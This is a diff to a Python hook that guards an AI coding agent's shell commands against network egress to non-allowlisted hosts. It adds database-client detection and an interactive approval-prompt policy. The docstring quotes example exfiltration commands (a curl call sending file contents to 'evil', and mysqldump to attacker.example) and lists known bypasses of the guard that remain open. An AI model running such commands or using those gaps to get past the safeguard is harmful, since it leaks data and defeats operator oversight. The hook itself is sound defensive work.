@@ -68,12 +68,23 @@ cannot be socially engineered):
    an explicit allowlisted registry host in the image reference says nothing
    about what a running container does on the network afterward — a
    Bash-command hook fundamentally can't see inside the container.
-4. Otherwise require the SAME `.claude/gate_passed` file + 4-hour TTL that
-   permission_auto.py already uses to unlock `git push`/`gh` operations after
-   a human runs /gate. No new confirmation mechanism — reuse the one that
-   already exists so behavior stays consistent across hooks. (This does mean
-   a /gate approval for an unrelated reason also opens a 4-hour network-
-   egress window — see the note in `.claude/commands/gate.md`.)
+4. Otherwise: in an INTERACTIVE session, ask the operator to approve this
+   one command (a PreToolUse `permissionDecision: "ask"`) — since 2026-08-29,
+   at the operator's request, instead of a hard block that forced a detour
+   through /gate. Inside an unattended daemon WORKER nobody can answer a
+   prompt, so the decision stays a hard block, byte-for-byte as before:
+   agent_providers sets FORGE_WORKER_CONTEXT=1 (plus FORGE_DAEMON=1 /
+   FORGE_EMPLOYEE_ID for employees) in every worker's environment and the
+   marker propagates to hooks. Verified 2026-08-29: in `bypassPermissions`
+   mode Claude Code treats a hook's "ask" as ALLOW (the probe command ran
+   with no prompt), so the prompt is only offered when the hook's
+   `permission_mode` input says a prompt can exist (default / acceptEdits /
+   plan); in bypassPermissions, dontAsk, or an unknown mode the decision is
+   a hard block whose reason tells the operator how to approve. The
+   `.claude/gate_passed` file + 4-hour TTL that permission_auto.py uses
+   after a human runs /gate still allows outright, in every context. (A
+   /gate approval for an unrelated reason also opens that 4-hour window —
+   see `.claude/commands/gate.md`.)
 5. All non-allowlisted destinations are gated regardless of HTTP verb.
    Verb-sniffing (block only -X POST/-d) is trivially bypassed by a plain GET
    that exfiltrates via query string (`curl https://evil/x?data=$(cat f)`),
@@ -95,13 +106,50 @@ permissions`, no `sandbox.enabled`, no `--settings` flag) — see
 the concrete steps needed before it can be wired in as a verified second
 layer. This hook remains the only enforced network-egress control until that
 lands.
+
+SCOUT-20260818-1
+-----------------
+On 2026-08-12 Dream (an Israeli AI/cyberdefense firm) published forensics on
+a near-autonomous, four-day AI-agent attack against Taiwan's government
+network and nuclear safety agency that harvested "six internal database
+credentials spanning MSSQL, Oracle, and Sybase systems" by chaining
+reconnaissance across systems discovered mid-attack — this hook's original
+NETWORK_EGRESS_PATTERNS had zero coverage for database-client CLIs, so a
+Bash command connecting to a remote DB host via psql/mysql/mongo/sqlcmd/
+sqlplus/redis-cli/isql bypassed the allowlist entirely. Added detection +
+extraction for those seven tools, anchored to "tool name + a host-bearing
+flag/connection-string" (not bare invocation, unlike ssh/scp) so purely
+local usage like `psql -c "select 1" mydb` isn't flagged. Also closed, per
+architecture review, three bypasses in the same class already fixed twice
+for curl (see TestSecondRoundBypasses): (1) env-var host overrides
+(PGHOST/MYSQL_HOST/SQLCMDSERVER) that set the real destination with no
+token on the command line at all — added to the connection-override check
+so their presence forces UNKNOWN like curl's `*_proxy=`; (2) attached
+short-flag values (`-hhost`, `-Sserver`, no space) alongside the
+space-separated form; (3) the legacy bare `mongo host:port/db` positional
+shorthand (no `-h`/`--host`, no `mongodb://` scheme). NOT covered: psql's
+`key=value` conninfo string (e.g. `psql "host=x port=5432"`) when the host
+portion sits inside a quoted multi-word argument that _structural_mask
+drops before any masked-form pattern sees it — closing that would require
+introducing a raw-vs-masked pattern split like block_dangerous.py's
+_RAW_ONLY, which is deferred as a separate follow-up rather than folded
+into this change's scope. Also NOT covered (flagged in security review as
+the natural next attacker pivot for this exact incident class, but out of
+the stated 7-tool scope): dump/restore tools (`mysqldump`, `pg_dump`/
+`pg_restore`, `mongodump`/`mongorestore`) — `\bmysql\b` word-boundaries
+don't match `mysqldump` (no boundary between `mysql` and `dump`), so
+`mysqldump -h attacker.example --all-databases` sails through undetected.
+A dedicated follow-up should extend NETWORK_EGRESS_PATTERNS/_db_client_hosts
+to this tool family.
 """
 
 import json
+import os
 import re
 import shlex
 import subprocess
 import sys
+from collections.abc import Mapping
 from urllib.parse import urlsplit
 
 try:
@@ -144,6 +192,33 @@ except ImportError:  # pragma: no cover - fallback if permission_auto unavailabl
 
 HOOK_NAME = "network_egress_guard"
 
+# Decision policy (2026-08-29): interactive session -> approval prompt;
+# unattended daemon worker -> hard block. See docstring point 4.
+_UNATTENDED_ENV_MARKERS = ("FORGE_WORKER_CONTEXT", "FORGE_DAEMON", "FORGE_EMPLOYEE_ID")
+
+
+def is_unattended_context(environ: Mapping[str, str] | None = None) -> bool:
+    """True inside a daemon worker, where no human can answer a prompt."""
+    env = os.environ if environ is None else environ
+    return any(env.get(marker) for marker in _UNATTENDED_ENV_MARKERS)
+
+
+# Permission modes in which Claude Code can show a prompt for a hook's "ask".
+# bypassPermissions treats "ask" as allow (verified 2026-08-29), dontAsk by
+# definition cannot prompt, and an unknown/missing mode is not trusted.
+_PROMPTABLE_MODES = frozenset({"default", "acceptEdits", "plan"})
+
+
+def prompts_possible(permission_mode: str | None) -> bool:
+    """True when a `permissionDecision: "ask"` would reach a human."""
+    return permission_mode in _PROMPTABLE_MODES
+
+
+def is_ask_decision(result_dict: dict) -> bool:
+    """True when the decision dict asks the operator instead of blocking."""
+    return result_dict.get("hookSpecificOutput", {}).get("permissionDecision") == "ask"
+
+
 # =============================================================================
 # High-signal network-egress command shapes. git/pip/docker/openssl ARE
 # in scope (judged by destination via the allowlist, not exempted from
@@ -166,7 +241,57 @@ NETWORK_EGRESS_PATTERNS = [
     r"socket\.(connect|create_connection)|http\.client)",
     r"\bnode\b\s+-e\s+.*(fetch\(|require\(['\"]https?['\"]\)|require\(['\"]net['\"]\))",
     r"\bperl\b\s+-e\s+.*(LWP::|IO::Socket)",
+    # Database client CLIs (SCOUT-20260818-1) — anchored to "tool name +
+    # host-bearing flag/connection-string", not bare invocation, so purely
+    # local usage (`psql -c "select 1" mydb`, no host) doesn't get flagged.
+    # The gap between tool name and flag is bounded to `[^;&|\n]*?` (a single
+    # command segment) — an earlier unbounded `[^\n]*` let a DB tool name
+    # anywhere on the line pair with an unrelated later command's `-h`/`-S`
+    # flag (e.g. `mysql -u root -p localdb; ls -h /tmp` misread as an
+    # unresolved DB connection). `-h`/`-S` presence itself is checked
+    # case-sensitively via _has_db_client_case_sensitive_flag below — NOT
+    # here — since psql's `-H` (HTML output) and sqlcmd/isql's `-s` (column
+    # separator / DSN, not server) are real, distinct, unrelated flags that
+    # an IGNORECASE match on this list would misread as a host flag.
+    r"\b(psql|mysql|mariadb|mongo(?:sh)?|redis-cli)\b[^;&|\n]*?--host\b",
+    r"\b(psql|mongo(?:sh)?|redis-cli)\b[^;&|\n]*?"
+    r"\b(postgres(?:ql)?|mongodb(?:\+srv)?|rediss?)://",
+    r"\bsqlplus\b[^;&|\n]*?@/{0,2}[A-Za-z0-9_.-]+",
+    r"\bmongo(?:sh)?\b\s+[A-Za-z0-9_.-]+:\d+(?:/\S*)?",  # legacy bare host:port/db
+    r"\b(?:PGHOST|MYSQL_HOST|SQLCMDSERVER)\s*=\S+[^;&|\n]*?\b(psql|mysql|mariadb|sqlcmd)\b",
 ]
+
+# `-h`/`-S` are checked separately from NETWORK_EGRESS_PATTERNS (and matched
+# case-SENSITIVELY, unlike everything else in this file) because folding case
+# there would misread two real, unrelated, differently-cased flags as the
+# host flag: psql's `-H` is HTML output format, and sqlcmd/isql's `-s` is a
+# column-separator character / DSN name, not `-S` (server). Each check is
+# scoped to the command segment immediately after a tool-name match (up to
+# the next `;`/`&`/`|`) so a DB tool name earlier on the line can't pair with
+# an unrelated later command's differently-cased flag either.
+_SEGMENT_BOUNDARY_RE = re.compile(r"[;&|]")
+_HOST_FLAG_TOOLS_RE = re.compile(
+    r"\b(?:psql|mysql|mariadb|mongo(?:sh)?|redis-cli)\b", re.IGNORECASE
+)
+_LOWERCASE_H_FLAG_RE = re.compile(r"(?<![\w-])-h(?=[A-Za-z0-9=]|\s)")
+_SQLCMD_ISQL_TOOL_RE = re.compile(r"\b(?:sqlcmd|isql)\b", re.IGNORECASE)
+_UPPERCASE_S_FLAG_RE = re.compile(r"(?<![\w-])-S(?=[A-Za-z0-9]|\s)")
+
+
+def _segment_after(form: str, start: int) -> str:
+    boundary = _SEGMENT_BOUNDARY_RE.search(form, start)
+    return form[start : boundary.start() if boundary else len(form)]
+
+
+def _has_db_client_case_sensitive_flag(form: str) -> bool:
+    for m in _HOST_FLAG_TOOLS_RE.finditer(form):
+        if _LOWERCASE_H_FLAG_RE.search(_segment_after(form, m.end())):
+            return True
+    for m in _SQLCMD_ISQL_TOOL_RE.finditer(form):
+        if _UPPERCASE_S_FLAG_RE.search(_segment_after(form, m.end())):
+            return True
+    return False
+
 
 # Flags/options that let the real TCP destination diverge from anything a URL
 # parser can see (DNS override, explicit proxy, SSH ProxyCommand, env-var/
@@ -176,7 +301,11 @@ NETWORK_EGRESS_PATTERNS = [
 _CONNECTION_OVERRIDE_CI_RE = re.compile(
     r"--resolve\b|--connect-to\b|--proxy\b|--socks(?:4a?|5h?)\b|ProxyCommand"
     r"|\b(?:https?|ftp|all)_proxy\s*="
-    r"|(?:-e|--execute)\s+\S*proxy",
+    r"|(?:-e|--execute)\s+\S*proxy"
+    # DB-client host env-var overrides (SCOUT-20260818-1) — same fail-closed
+    # treatment as curl's *_proxy=: these set the real connection target with
+    # no token on the command line for a URL/flag parser to see at all.
+    r"|\b(?:PGHOST|MYSQL_HOST|SQLCMDSERVER)\s*=",
     re.IGNORECASE,
 )
 # curl's `-x` (lowercase) is the proxy shorthand; `-X` (uppercase) is the
@@ -267,24 +396,51 @@ def _parse_url_host(token: str) -> str | None:
 _BARE_HOST_TOKEN_RE = re.compile(r"^[A-Za-z0-9_.-]+\.[A-Za-z]{2,}(?:[:/].*)?$")
 
 
+# Tools whose positional arguments are URLs or bare hosts. A scheme-less
+# token (`attacker.example/x`) only counts as a destination when one of these
+# precedes it in the same shell segment — otherwise every `name.ext` token in
+# the command (a filename in a heredoc, `index.lock`, `INTERVENTIONS.md`)
+# read as a host and the guard blocked plain file writes (2026-08-28).
+# Tokens carrying an explicit `://` still count wherever they appear.
+_URL_BEARING_TOOLS = frozenset(
+    {"curl", "wget", "git", "pip", "pip3", "uv", "docker", "openssl"}
+)
+_SCP_STYLE_TOOLS_RE = re.compile(r"\b(?:git|scp|rsync)\b")
+
+
 def _extract_url_hosts(command: str) -> set[str]:
     """Extract hosts from URL-bearing tokens (curl/wget/git/pip and any bare
     https?:// occurrence), tokenizing each de-obfuscated canonical form with
     shlex and parsing candidate tokens through urlsplit — see _parse_url_host
-    for why that (not a regex capture) is what defeats the userinfo trick."""
+    for why that (not a regex capture) is what defeats the userinfo trick.
+    Scheme-less tokens are considered only after a URL-bearing tool in the
+    same segment; git's scp-style `host:path` only in segments that invoke
+    git/scp/rsync."""
     hosts: set[str] = set()
     for raw_form in _canonical_forms(command):
-        try:
-            tokens = shlex.split(raw_form, comments=False, posix=True)
-        except ValueError:
-            tokens = raw_form.split()
-        for tok in tokens:
-            if "://" in tok or _BARE_HOST_TOKEN_RE.match(tok):
-                host = _parse_url_host(tok)
+        for segment in _SEGMENT_BOUNDARY_RE.split(raw_form):
+            if not segment.strip():
+                continue
+            try:
+                tokens = shlex.split(segment, comments=False, posix=True)
+            except ValueError:
+                tokens = segment.split()
+            url_tool_seen = False
+            for tok in tokens:
+                if tok in _URL_BEARING_TOOLS:
+                    url_tool_seen = True
+                    continue
+                if "://" in tok:
+                    host = _parse_url_host(tok)
+                elif url_tool_seen and _BARE_HOST_TOKEN_RE.match(tok):
+                    host = _parse_url_host(tok)
+                else:
+                    host = None
                 if host:
                     hosts.add(host)
-        for m in _GIT_SCP_STYLE_RE.finditer(raw_form):
-            hosts.add(m.group(1).lower())
+            if _SCP_STYLE_TOOLS_RE.search(segment):
+                for m in _GIT_SCP_STYLE_RE.finditer(segment):
+                    hosts.add(m.group(1).lower())
     return hosts
 
 
@@ -339,6 +495,61 @@ def _git_remote_hosts(command: str) -> set[str]:
     return hosts
 
 
+# Database client CLI host extraction (SCOUT-20260818-1). URI-form connect
+# strings (postgresql://, mongodb://, redis://) need no dedicated regex here
+# — _extract_url_hosts already parses any `scheme://` token via urlsplit
+# regardless of which tool it belongs to. These cover the non-URL syntaxes:
+# -h/--host (space-separated or attached, e.g. `-hhost`), sqlcmd/isql's -S
+# (optionally `tcp:`-prefixed, comma/backslash-suffixed with port/instance),
+# Oracle sqlplus's `user/pass@[//]host[:port]` connect string, and the
+# legacy bare `mongo host:port/db` positional shorthand.
+#
+# _DB_HOST_FLAG_RE/_SQLCMD_HOST_RE/_ISQL_HOST_RE are deliberately NOT
+# re.IGNORECASE — see _has_db_client_case_sensitive_flag's docstring above
+# for why folding case on `-h`/`-S` would misparse psql's `-H` (HTML output)
+# or sqlcmd/isql's `-s` (column separator/DSN) as a host flag. A tool
+# invoked with unusual casing (`SQLCMD -S ...`) is still flagged by
+# detection (case-insensitive there) but its host won't extract here —
+# hosts empty means fail-closed/gated, never silently allowed.
+_DB_HOST_FLAG_RE = re.compile(
+    r"\b(?:psql|mysql|mariadb|mongo(?:sh)?|redis-cli)\b[^;&|\n]*?"
+    r"(?:(?<![\w-])-h(?:=|\s+)?|--host(?:=|\s+))"
+    r"([A-Za-z0-9][A-Za-z0-9_.-]*)"
+)
+_SQLCMD_HOST_RE = re.compile(
+    r"\bsqlcmd\b[^;&|\n]*?(?<![\w-])-S(?:=|\s*)(?:tcp:)?"
+    r"([A-Za-z0-9][A-Za-z0-9_.\\,-]*)"
+)
+_ISQL_HOST_RE = re.compile(
+    r"\bisql\b[^;&|\n]*?(?<![\w-])-S(?:=|\s*)([A-Za-z0-9][A-Za-z0-9_.-]*)"
+)
+_SQLPLUS_HOST_RE = re.compile(
+    r"\bsqlplus\b[^;&|\n]*?@/{0,2}([A-Za-z0-9_.-]+)",
+    re.IGNORECASE,
+)
+_MONGO_BARE_HOSTPORT_RE = re.compile(
+    r"\bmongo(?:sh)?\b\s+([A-Za-z0-9_.-]+):\d+(?:/\S*)?",
+    re.IGNORECASE,
+)
+
+
+def _db_client_hosts(command: str) -> set[str]:
+    """Extract hosts from database-client connect syntax that isn't URL
+    syntax — see the constants above for the specific forms covered."""
+    hosts: set[str] = set()
+    for m in _DB_HOST_FLAG_RE.finditer(command):
+        hosts.add(m.group(1).split(":")[0].strip("."))
+    for m in _SQLCMD_HOST_RE.finditer(command):
+        hosts.add(m.group(1).split(",")[0].split("\\")[0].strip("."))
+    for m in _ISQL_HOST_RE.finditer(command):
+        hosts.add(m.group(1).split(",")[0].strip("."))
+    for m in _SQLPLUS_HOST_RE.finditer(command):
+        hosts.add(m.group(1).split(":")[0].strip("."))
+    for m in _MONGO_BARE_HOSTPORT_RE.finditer(command):
+        hosts.add(m.group(1).strip("."))
+    return hosts
+
+
 def extract_hosts(command: str) -> set[str]:
     """Extract every destination host referenced by a network-egress command.
     Strips port suffixes. Returns an empty set if none could be extracted (or
@@ -350,6 +561,7 @@ def extract_hosts(command: str) -> set[str]:
     hosts: set[str] = set()
     hosts |= _extract_url_hosts(command)
     hosts |= _git_remote_hosts(command)
+    hosts |= _db_client_hosts(command)
     for pattern in HOST_EXTRACTION_PATTERNS:
         for m in re.finditer(pattern, command, re.IGNORECASE):
             host = m.group(1)
@@ -364,6 +576,9 @@ def extract_hosts(command: str) -> set[str]:
 def is_network_egress(command: str) -> bool:
     raw_forms = _canonical_forms(command)
     masked_forms = [m for m in (_structural_mask(f) for f in raw_forms) if m]
+    for form in masked_forms:
+        if _has_db_client_case_sensitive_flag(form):
+            return True
     for pattern in NETWORK_EGRESS_PATTERNS:
         for form in masked_forms:
             if re.search(pattern, form, re.IGNORECASE):
@@ -371,11 +586,23 @@ def is_network_egress(command: str) -> bool:
     return False
 
 
-def check_command(command: str, allowlist: list[str] | None = None):
+def check_command(
+    command: str,
+    allowlist: list[str] | None = None,
+    *,
+    unattended: bool | None = None,
+    permission_mode: str | None = None,
+):
     """Check a Bash command for non-allowlisted network egress.
 
-    Returns (result_dict, hosts) if the command should be blocked, or None if
-    it's safe to run (not egress, fully allowlisted, or gate already passed).
+    Returns (result_dict, hosts) when the command must not run unreviewed,
+    or None if it's safe (not egress, fully allowlisted, or gate passed).
+    The dict is a hard block (`{"decision": "block", ...}`, exit code 2) in
+    an unattended worker, and an approval prompt
+    (`{"hookSpecificOutput": {"permissionDecision": "ask", ...}}`, exit 0)
+    in an interactive session whose ``permission_mode`` can show one
+    (prompts_possible). ``unattended`` None means detect from the
+    environment (is_unattended_context).
     """
     if not is_network_egress(command):
         return None
@@ -393,12 +620,38 @@ def check_command(command: str, allowlist: list[str] | None = None):
         return None
 
     destination = ", ".join(sorted(hosts)) if hosts else "(destination unresolved)"
+    if unattended is None:
+        unattended = is_unattended_context()
+    if unattended:
+        reason = (
+            f"Outbound network egress to non-allowlisted destination: {destination}. "
+            f"Unattended worker — hard block. Add the host to forge-config.json "
+            f"security.network_allowlist if it's a legitimate recurring need."
+        )
+        return {"decision": "block", "reason": f"BLOCKED: {reason}"}, hosts
+    if not prompts_possible(permission_mode):
+        mode = permission_mode or "unknown"
+        reason = (
+            f"Outbound network egress to non-allowlisted destination: {destination}. "
+            f"This session's permission mode ({mode}) cannot show an approval "
+            f"prompt, so the command is blocked. To approve: run /gate (opens a "
+            f"4h window), add the host to forge-config.json "
+            f"security.network_allowlist, or switch the session to default "
+            f"permission mode to get an inline prompt."
+        )
+        return {"decision": "block", "reason": f"BLOCKED: {reason}"}, hosts
     reason = (
         f"Outbound network egress to non-allowlisted destination: {destination}. "
-        f"Run /gate to approve, or add the host to forge-config.json "
-        f"security.network_allowlist if it's a legitimate recurring need."
+        f"Approve to run this one command; for a recurring need add the host to "
+        f"forge-config.json security.network_allowlist (or /gate opens a 4h window)."
     )
-    return {"decision": "block", "reason": f"BLOCKED: {reason}"}, hosts
+    return {
+        "hookSpecificOutput": {
+            "hookEventName": "PreToolUse",
+            "permissionDecision": "ask",
+            "permissionDecisionReason": reason,
+        }
+    }, hosts
 
 
 # =============================================================================
@@ -410,15 +663,21 @@ def truncate_command(command: str, max_length: int = 60) -> str:
     return command[: max_length - 3] + "..."
 
 
-def print_block_box(command: str, hosts: set[str]) -> None:
+def print_block_box(command: str, hosts: set[str], ask: bool = False) -> None:
     truncated = truncate_command(command)
     destination = ", ".join(sorted(hosts)) if hosts else "(unresolved)"
     description = "Destination"
+    title = "NETWORK EGRESS — APPROVAL REQUIRED" if ask else "NETWORK EGRESS BLOCKED"
+    tip = (
+        "TIP: Approve once, or allowlist the host for recurring use"
+        if ask
+        else "TIP: Use /gate to approve, or allowlist the host"
+    )
 
     content_width = max(60, len(truncated) + 4, len(destination) + len(description) + 4)
     top_border = "═" * (content_width + 2)
     print(f"\n╔{top_border}╗", file=sys.stderr)
-    print(f"║ {'NETWORK EGRESS BLOCKED':^{content_width}} ║", file=sys.stderr)
+    print(f"║ {title:^{content_width}} ║", file=sys.stderr)
     print(f"╠{top_border}╣", file=sys.stderr)
     print(f"║ Command: {truncated:<{content_width - 9}} ║", file=sys.stderr)
     print(
@@ -426,10 +685,7 @@ def print_block_box(command: str, hosts: set[str]) -> None:
         file=sys.stderr,
     )
     print(f"╠{top_border}╣", file=sys.stderr)
-    print(
-        f"║ {'TIP: Use /gate to approve, or allowlist the host':<{content_width}} ║",
-        file=sys.stderr,
-    )
+    print(f"║ {tip:<{content_width}} ║", file=sys.stderr)
     print(f"╚{top_border}╝\n", file=sys.stderr)
 
 
@@ -446,13 +702,18 @@ def main():
             sys.exit(0)
 
         command = tool_input.get("command", "")
-        result = check_command(command)
+        result = check_command(
+            command, permission_mode=input_data.get("permission_mode")
+        )
 
         if result:
             result_dict, hosts = result
-            print_block_box(command, hosts)
+            ask = is_ask_decision(result_dict)
+            print_block_box(command, hosts, ask=ask)
             print(json.dumps(result_dict))
-            sys.exit(get_exit_code(HOOK_NAME, issue_found=True))
+            # An approval prompt is a normal exit with JSON on stdout; a hard
+            # block keeps the exit-2 contract Claude Code treats as a deny.
+            sys.exit(0 if ask else get_exit_code(HOOK_NAME, issue_found=True))
 
         sys.exit(0)
 
